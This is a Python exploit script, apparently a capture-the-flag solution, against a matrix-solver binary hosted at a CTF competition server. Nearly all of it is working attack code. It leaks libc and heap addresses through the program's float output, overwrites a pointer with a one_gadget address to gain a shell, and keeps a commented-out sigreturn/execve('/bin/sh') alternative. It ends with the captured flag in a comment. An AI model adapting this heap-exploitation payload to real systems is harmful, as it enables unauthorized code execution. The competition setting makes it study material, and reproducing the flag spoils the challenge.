#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './solver'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'lremote', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', lremote = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        lremote = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'solver.ctfcompetition.com', 'port':1337})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        lremote = 'libc-2.24.so', \
                        remote  = 'libc-2.24.so')   # debian 9.9
env.set_item('offset_libc', debug   = 0x470, local   = 0x470, lremote  = 0x558, remote  = 0x558)
env.set_item('offset_heap', debug   = 0x12350, local   = 0x12350, lremote  = 0x11d10, remote  = 0x11d10)
env.set_item('offset_onegadget', debug = 0xe569f, local   = 0xe569f, lremote  = 0xb8c0f, remote  = 0xb8c0f)
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    conn.sendlineafter('variables: ', '15')
    conn.sendafter('matrix:\n', '\n'*15)

    conn.sendlineafter('variables: ', '15')
    conn.sendafter('matrix:\n', '\n'*15)

    leak = conn.recvuntil('\nEnter').split('\n')
    if env.check(['remote', 'lremote']):
        leak = leak[2].split()[:4:2]
    else:
        leak = leak[9].split()[:4:2]
    leak = map(lambda x : struct.unpack('<Q', struct.pack('<d', float(x)))[0], leak)

    addr_libc_mainarena = leak[0] - env.offset_libc
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_execve     = libc.sep_function['execve']
    addr_libc_setcontext = libc.sep_function['setcontext']
    addr_libc_str_sh     = next(libc.search('/bin/sh'))
    # addr_libc_gets       = libc.sep_function['gets']
    addr_libc_onegadget  = libc.address + env.offset_onegadget

    addr_heap_base = leak[1] - env.offset_heap
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    data         = [0]*((0x10 if env.check(['remote', 'lremote']) else 0x50)/8)
    # data[0]      = addr_libc_gets
    data[0]      = addr_libc_onegadget

    payload, s = mk_matrix(data)
    conn.sendlineafter('variables: ', str(len(payload)))
    conn.recvuntil('matrix:\n')
    for x in payload:
        conn.sendline(x)

    conn.sendlineafter('variables: ', '2')
    conn.sendafter('matrix:\n', '{}\n\n'.format(s))

    '''
    frame = SigreturnFrame()
    frame.rdi = addr_libc_str_sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = addr_libc_execve

    exploit  = p64(addr_heap_base + env.offset_heap+0x50 + 0x20)
    exploit += p64(0)
    exploit += p64(addr_heap_base)
    exploit  = exploit.ljust(0x20)
    exploit += p64(addr_libc_setcontext + 0x3c)
    exploit += str(frame)[0x28:]
    conn.sendline(exploit)

    conn.sendlineafter('variables: ', '2')
    conn.sendafter('matrix:\n', '\n'*2)
    '''

def mk_matrix(data):
    n = len(data)

    payload = []
    s = 0
    for i in range(n):
        rs = [randint(-4, 4) for _ in range(n)]
        x = 0
        for j in range(n):
            x += data[j]*rs[j]

        payload += [' '.join(map(str, rs + [x]))]
        s += sum(rs)+x

    return payload, s

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # CTF{d0n7_l34v3_7h3m_d4ng1in9!}

#==========
